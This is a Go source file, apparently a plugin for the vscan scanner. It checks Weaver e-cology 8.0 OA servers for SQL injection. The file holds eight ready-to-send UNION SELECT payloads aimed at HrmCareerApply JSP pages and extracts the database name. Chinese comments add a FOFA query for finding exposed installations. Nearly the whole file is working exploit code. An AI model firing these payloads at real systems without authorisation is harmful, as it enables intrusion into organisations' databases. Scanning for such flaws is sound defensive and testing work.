package weaver

import (
	"fmt"
	"github.com/veo/vscan/pkg"
	"strings"
)

//## 漏洞类型
//
//SQL注入
//
//## 简介
//
//泛微新一代移动办公平台e-cology8.0不仅组织提供了一体化的协同工作平台,将组织事务逐渐实现全程电子化,改变传统纸质文件、实体签章的方式。泛微OA E-Cology v8.0平台CheckServer.jsp处存在SQL注入漏洞，攻击者通过漏洞可以获取数据库权限。
//
//## 搜索语法
//
//fofa：`app="泛微-协同办公OA"`
//
//## POC

func HrmCareerApplyPerView_sql(u string) bool {
	payloads := []string{"/pweb/careerapply/HrmCareerApplyPerEdit.jsp?id=1%20union%20select%201%2C2%2C3%2Cdb_name%281%29%2C5%2C6%2C7",
		"/pweb/careerapply/HrmCareerApplyPerView.jsp?id=1%20union%20select%201%2C2%2C3%2Cdb_name%281%29%2C5%2C6%2C7",
		"/pweb/careerapply/HrmCareerApplyWorkEdit.jsp?id=1%20union%20select%201%2C2%2C3%2Cdb_name%281%29%2C5%2C6",
		"/pweb/careerapply/HrmCareerApplyWorkView.jsp?id=1%20union%20select%201%2C2%2C3%2Cdb_name%281%29%2C5%2C6",
		"/web/careerapply/HrmCareerApplyPerEdit.jsp?id=1%20union%20select%201%2C2%2C3%2Cdb_name%281%29%2C5%2C6%2C7",
		"/web/careerapply/HrmCareerApplyPerView.jsp?id=1%20union%20select%201%2C2%2C3%2Cdb_name%281%29%2C5%2C6%2C7",
		"/web/careerapply/HrmCareerApplyWorkEdit.jsp?id=1%20union%20select%201%2C2%2C3%2Cdb_name%281%29%2C5%2C6",
		"/web/careerapply/HrmCareerApplyWorkView.jsp?id=1%20union%20select%201%2C2%2C3%2C4%2C5%2Cdb_name%281%29"}

	for _, payload := range payloads {
		if req, err := pkg.HttpRequset(u+payload, "GET", "", false, nil); err == nil {
			if req.StatusCode == 200 && strings.Contains(req.Body, "master") {
				pkg.GoPocLog(fmt.Sprintf("Found vuln weaver SQL注入-HrmCareerApplyPerView!|%s\n", u+payload))
				return true
			}
		}
	}

	return false

}
